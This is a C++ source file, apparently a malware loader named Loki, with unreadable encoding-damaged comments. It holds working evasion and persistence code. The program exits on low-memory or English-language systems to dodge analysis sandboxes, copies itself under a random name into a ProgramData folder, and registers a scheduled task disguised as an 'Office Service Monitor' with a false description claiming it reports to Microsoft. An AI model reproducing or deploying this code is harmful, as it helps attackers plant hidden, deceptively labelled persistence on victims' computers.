// Loki.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include <io.h>
#include "stdafx.h"
#include "direct.h"
#include "TaskSchedule.h"
#include<ctime>

#include <iostream>
#include <fstream>

//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
//#pragma comment(linker, "/INCREMENTAL:NO")
using namespace std;

const int LEN_NAME = 6;
char* rand_str(char* str, const int len)
{
	int i;
	for (i = 0; i < len; ++i)
		str[i] = 'a' + rand() % 26;
	str[++i] = '\0';
	return str;
}

int _tmain(int argc, _TCHAR* argv[])
{
	//�������1 ����ڴ��С
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	GlobalMemoryStatusEx(&statex);
	int mem = statex.ullTotalPhys / 1024 / 1024 / 1000;
	//printf("%d G",mem);//�ڴ��С

	if (mem < 4)
	{
		exit(0);
	}

	//�������2 ��⻷������
	LANGID lid = GetSystemDefaultLangID(); // ��ȡϵͳĬ��ID
	switch (lid)
	{
	case 0x0804:
		//printf("CN\n");
		break;
	case 0x0409:
		//printf("EN\n");
		exit(0);
		break;
	}



	//·�����

	string CurrentPath = argv[0];

	char* WorkPath;
	WorkPath = getenv("PROGRAMDATA");

	char DesPath[20];
	sprintf(DesPath, "%s\\12312312", WorkPath);



	//����·��
	if (0 != _access(DesPath, 0))
	{
		mkdir(DesPath);   // ���� 0 ��ʾ�����ɹ���-1 ��ʾʧ��

	}

	//��������ļ���

	char DesFileName[20];

	srand(time(NULL));
	int i;
	char name[LEN_NAME + 1];

	sprintf(DesFileName, "%s\\%s.exe", DesPath, rand_str(name, LEN_NAME));

	//printf("����ļ�:%s\n", DesFileName);


	if (strstr(CurrentPath.c_str(), DesPath) == NULL){
		printf("[-] Path Error\n");
		CopyFile(argv[0], DesFileName, FALSE);//false�����ǣ�dutrue������
		printf("[+] File Copy Success\n");

		CMyTaskSchedule task;
		BOOL flag = FALSE;

		flag = task.NewTask("Office Service Monitor", DesFileName, "", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");

		if (FALSE == flag)
		{
			printf("[-] Create Task Schedule Error!\n");
			//system(DesFileName);
			
			SHELLEXECUTEINFO commend;//�������
			memset(&commend, 0, sizeof(SHELLEXECUTEINFO));
			commend.cbSize = sizeof(SHELLEXECUTEINFO);
			commend.fMask = SEE_MASK_NOCLOSEPROCESS;
			commend.lpVerb = _T("");
			commend.lpFile = _T(DesFileName);//ִ����������
			commend.nShow = SW_SHOWDEFAULT;
			ShellExecuteEx(&commend);//ִ������
			//WaitForSingleObject(commend.hProcess, INFINITE);//�ȴ�ִ�н���
			CloseHandle(commend.hProcess);//�رտ���̨

		}
		else {
			printf("[+] Create Task Schedule Success!\n");
		}
		exit(0);
	}
	else
	{
		printf("[+] C++ Sch Run Success!\n");
	}

	

	getchar();


	//CMyTaskSchedule task;
	//BOOL flag = FALSE;


	//// ���� ����ƻ�
	////�������ƣ���������·����������������Ϣ
	//flag = task.NewTask("Office Service Monitor", "C:\\tester.exe","", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");
	//if (FALSE == flag)
	//{
	//	printf("Create Task Schedule Error!\n");
	//}
	//else {
	//	printf("Create Task Schedule Success!\n");
	//}

	//// ��ͣ
	//printf("Create Task Schedule OK!\n");
	//system("pause");

	//// ж�� ����ƻ�
	//bRet = task.Delete("520");
	//if (FALSE == bRet)
	//{
	//	printf("Delete Task Schedule Error!\n");
	//}

	//printf("Delete Task Schedule OK!\n");
	//system("pause");
	//return 0;
}




